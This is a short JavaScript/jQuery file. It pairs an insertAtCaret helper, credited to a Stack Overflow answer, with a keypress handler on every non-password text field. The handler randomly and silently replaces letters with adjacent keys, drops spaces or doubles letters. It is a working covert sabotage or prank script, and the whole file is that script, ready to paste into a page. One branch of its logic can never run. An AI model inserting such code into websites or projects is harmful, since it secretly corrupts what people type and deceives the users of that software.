//http://stackoverflow.com/questions/5203428/inserting-text-after-cursor-position-in-text-are/12815163#12815163
jQuery.fn.extend({
insertAtCaret: function(myValue, myValueE){
  return this.each(function(i) {
    if (document.selection) {
      //For browsers like Internet Explorer
      this.focus();
      sel = document.selection.createRange();
      sel.text = myValue + myValueE;
      this.focus();
    }
    else if (this.selectionStart || this.selectionStart == '0') {
      //For browsers like Firefox and Webkit based
      var startPos = this.selectionStart;
      var endPos = this.selectionEnd;
      var scrollTop = this.scrollTop;
      this.value = this.value.substring(0,     startPos)+myValue+this.value.substring(startPos,endPos)+myValueE+this.value.substring(endPos,this.value.length);
      this.focus();
      this.selectionStart = startPos + myValue.length;
      this.selectionEnd = ((startPos + myValue.length) + this.value.substring(startPos,endPos).length);
      this.scrollTop = scrollTop;
    } else {
      this.value += myValue;
      this.focus();
    }
  })
    }
});

$(document).on("keypress", "input[type!='password'], textarea", function (event) {
    if ((event.keyCode >= 65 && event.keyCode <= 90) || (event.keyCode >= 97 && event.keyCode <= 122)) {
        if (Math.random() < 0.02) {
            event.preventDefault();
            $(this).insertAtCaret(moveKey[String.fromCharCode(event.keyCode)], "");
            return;
        }
    }
    if (event.keyCode === 32) {
        if (Math.random() < 0.01) {        
            event.preventDefault();
            $(this).insertAtCaret("", "");
        }
        return;
    }
    if ((event.keyCode >= 65 && event.keyCode <= 90) || (event.keyCode >= 97 && event.keyCode <= 122)) {
        if (Math.random() < 0.02) {
            event.preventDefault();
            $(this).insertAtCaret(String.fromCharCode(event.keyCode) + String.fromCharCode(event.keyCode), "");
        }
        return;
    }
    if ((event.keyCode >= 65 && event.keyCode <= 90) || (event.keyCode >= 97 && event.keyCode <= 122)) {
        if (Math.random() < 0.02) {
            event.preventDefault();
            $(this).insertAtCaret("", "");
        }
        return;
    }
});

var moveKey = {
    "q": "w",
    "w": "e",
    "e": "r",
    "r": "t",
    "t": "y",
    "y": "u",
    "u": "i",
    "i": "o",
    "o": "p",
    "p": "o",
    "a": "s",
    "s": "d",
    "d": "f",
    "f": "g",
    "g": "h",
    "h": "j",
    "j": "k",
    "k": "l",
    "l": "k",
    "z": "x",
    "x": "c",
    "c": "v",
    "v": "b",
    "b": "n",
    "n": "m",
    "m": "n",
    "Q": "W",
    "W": "E",
    "E": "R",
    "R": "T",
    "T": "Y",
    "Y": "U",
    "U": "I",
    "I": "O",
    "O": "P",
    "P": "O",
    "A": "S",
    "S": "D",
    "D": "F",
    "F": "G",
    "G": "H",
    "H": "J",
    "J": "K",
    "K": "L",
    "L": "K",
    "Z": "X",
    "X": "C",
    "C": "V",
    "V": "B",
    "B": "N",
    "N": "M",
    "M": "N"
};